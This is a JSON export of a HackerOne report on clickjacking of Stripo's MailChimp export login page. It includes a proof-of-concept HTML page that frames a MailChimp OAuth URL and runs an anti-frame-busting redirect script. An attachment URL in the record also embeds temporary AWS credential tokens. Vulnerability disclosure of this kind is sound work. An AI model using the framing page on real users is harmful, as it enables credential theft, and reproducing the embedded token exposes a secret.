@@ -1,0 +1,125 @@
+{
+  "id": 737625,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Mzc2MjU=",
+  "url": "https://hackerone.com/reports/737625",
+  "title": "Clickjacking on my.stripo.email for MailChimp credentials ",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "medium",
+  "readable_substate": "Informative",
+  "created_at": "2019-11-14T19:41:04.154Z",
+  "submitted_at": "2019-11-14T19:41:04.154Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jasongardner",
+    "url": "/jasongardner",
+    "profile_picture_urls": {
+      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NjA5NDA3NSwicHVyIjoiYmxvYl9pZCJ9fQ==--bfd1447ba29cdf49f73c361bc444a47d83ed4937/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGVnIiwiZ3Jhdml0eSI6IkNlbnRlciIsInJlc2l6ZSI6IjYyeDYyXiIsImNyb3AiOiI2Mng2MiswKzAifSwicHVyIjoidmFyaWF0aW9uIn19--0e8fb5b1a245559716caa2abf00b1571bf3c5040/IMG_1019.jpeg"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 42368,
+    "url": "https://hackerone.com/stripo",
+    "handle": "stripo",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Stripo Inc",
+      "twitter_handle": "",
+      "website": "https://stripo.email",
+      "about": "Stripo is a lightweight and intuitive email template editor that lets users build professional looking and highly responsive email templates."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-01-08T08:55:51.475Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-01-07T07:52:52.742Z",
+  "team_member_agreed_on_going_public_at": "2020-01-08T08:55:51.179Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Clickjacking is a malicious hacking technique where attackers can acquire sensitive data.\n\nThrough simple social engineering techniques these links can be sent out to unsuspecting customers to steal their credentials or perform actions on their accounts.\n\nFor this example I saw that where I goto export to MailChimp that page is vulnerable to clickjacking and it is a page where the user enters a username and password which would grant me whatever access that user has if I just feed the data from a keylogger on the HTML into another page with tables to store the info.\n\nHere is the HTML code I have embedded on my sites.google.com link:\n\n<html>\n<head>\n<title>Clickjack test page</title>\n</head>\n<body>\n<p>When you enter your e-mail and login here it will be captured and the attacker can now gain access to your customer e-mail lists</p>\n\t\n<iframe src= \"https://login.mailchimp.com/oauth2/authorize?response_type=code&client_id=350877244304&redirect_uri=https%3A%2F%2Fmy.stripo.email%2Fcabinet%2Fexportservice%2Fv1%2Fmailchimpauth.html%3FaccountId%3D2085372\" width=\"1200\" height=\"2500\"></iframe>\n\n\t<script language=\"JavaScript\" type=\"text/javascript\">\n    //<![CDATA[\n        window.onbeforeunload = function(){\n            return 'Are you sure you want to leave?';\n        };\n    //]]>\nhtml2canvas(document.querySelector(\"#capture\")).then(canvas => {\n    document.body.appendChild(canvas)\n});\n</script>\n\t</body>\n<script>\nvar prevent_bust = 0;\nwindow.onbeforeunload = function() {\nprevent_bust++;\n};\nsetInterval(\nfunction() {\nif (prevent_bust > 0) {\nprevent_bust -= 2;\nwindow.top.location = \"https://sites.google.com/view/jason-gardner-app-dev/xss-test-poc\";\n\n\n}\n}, 1);\n</script>\n\n</html>\n\n## Impact\n\nAn attacker could send out malicious emails to entire customer lists, delete accounts or go in and take whatever billing information exists within the MailChimp account.",
+  "weakness": {
+    "id": 74,
+    "name": "UI Redressing (Clickjacking)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 634619,
+      "file_name": "Screen_Shot_2019-11-14_at_11.36.54_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GyydkuepbagYGZ2vgudsZioV?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-11-14_at_11.36.54_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-11-14_at_11.36.54_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUSK2VYH5%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T125139Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCFrCxdL93Lf%2FbL6om0DM%2FlYKpTQ6gDQMQJ9hYvgP5dwwIgL7xHbYmrcsl%2B%2BtVo0MkjCCA27EolsI%2BxKy1dEasrBVAqsQUIFBADGgwwMTM2MTkyNzQ4NDkiDINyrMtutciL3NTb1CqOBRDCxppe%2FDST7HhBxQjSAwq9e7IPEJEL%2BWZsP7BIgIM1LFviOBmkbEJAjaK5BrMHVFu9dAv%2FZQk%2FlXwSrjTHx8VD65pbvThXFpsPw4%2BEwkoo9NqqUM8Oa1lPyXsoIGvN7VfgmtHLdxMDMWMunRKuBRSnTepD4cyTWFl0ZvAJuZNH%2BPwT9Qp13QOQOrMIG7UuBr3hEp%2F9zTuofo%2Bq3CFusDR5VNL%2FYbJd7jJhg8ccq1knQbd7IcTjUZ%2BIhKoHdTGyktB24FRz9BfNSTScMrzJKbygYbozfiRbsMFcoflOuVBRK4XREt4beT0cYSu3qPN9Ct%2FUeVtKpz5AmeWpMoxE5JwMA5URJtq2aAP5WX3%2Bj0hiZqpdeHNL6nyIqZyKTK3fRff8OEGul98c%2BboCfp%2BRuSs3kCusetniuOYh6ChAk5ZSHeSo0oQKPQsvTlz5C9OykYUz%2F1XAVx%2BDgLM3JkzIRTUQMA4BbAZ2kgTgGxm6ECyspsowo%2FDgzqdMIvmgk1Ktn%2BSCJkSH91Ydxnme6nIuuSAXXLPvb2U9%2FSYPiyPCiyxId5HKZiluTS%2Bo20UYlpj2lddgr0j8MUE73OByEECHoT15c8N9CMAZBxuRx8QZPGjrtMr3vW6ouy%2F9NaXu3gfkkCKw8gvxBt4shrjLShY2RhST416y1CgaNJF0woFVP%2B7hku%2FGvi%2FBuO%2FOHhnuaOUHcLivD%2FPX8ujT418e6L5Nf0BgV6yjEN7HFi6fVWNrbi%2F477IHk7ITY3lOKWfGsqZV%2FSCPCO0LlOPu287JobA8bu8VB%2F9w2Q026YCP%2Bsm3EB7yDu%2BWstwIZCGSQCBqY0ah7itdAtMm8Ys5rp%2BHjvqHzK3bbl59ukN9%2FYcfpQFZMTDKo7%2FGBjqxAXmkCu%2BxVPamGt0hqmxBHyIUXfmfoUo0Bum8aI0%2FkrJnohpLZjrjnqnovenmc7VfnKUq8xtJdeoYsGtY78yWXkI2VSrky7x%2B%2B6oxDo2HsmRiXO2lyP5Y8lE%2FXjZbG6SXNECA8JNV32HhhpbgtRMz746fStdfEOze0FOc5iH4gPqTIsO%2Fow5GzJFbq8KC%2BL8Y%2BAYwZ0zc3YUkyIuYRdYLbqjptEwIme41FOYIbEUK1VFj7Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ef30551c2aeca05a99396d4d843e4daef167add9a2eef020d523bdf823f7833e",
+      "file_size": 388752,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 7,
+  "voters": [
+    "0xelkomy",
+    "zimmer75",
+    "queen_of_hearts",
+    "hakmod",
+    "stish834",
+    "prags",
+    "densdo"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 38702,
+    "asset_type": "URL",
+    "asset_identifier": "my.stripo.email",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
